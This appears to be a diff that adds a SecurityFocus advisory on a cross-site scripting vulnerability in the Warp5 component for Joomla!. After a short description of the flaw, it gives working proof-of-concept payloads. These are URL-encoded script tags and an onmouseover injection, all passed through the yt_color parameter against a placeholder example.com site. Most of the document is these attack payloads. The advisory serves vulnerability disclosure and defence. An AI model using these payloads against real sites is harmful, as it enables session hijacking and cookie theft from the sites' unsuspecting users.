@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/37239/info
+
+The Warp5 component for Joomla! is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks. 
+
+http://www.example.com/index.php/inicio?yt_color=%3E%22%3E%3CScRiPt%20%0a%0d%3Ealert(12346)%3B%3C/ScRiPt%3E
+http://www.example.com/index.php?option=com_content&task=view&id=13&Itemid=47&yt_color=%00&#039;%22%3E%3CScRiPt%20%0a%0d%3Ealert(123456)%3B%3C/ScRiPt%3E
+The GET variable yt_color can be set to "+onmouseover=alert(123456)+
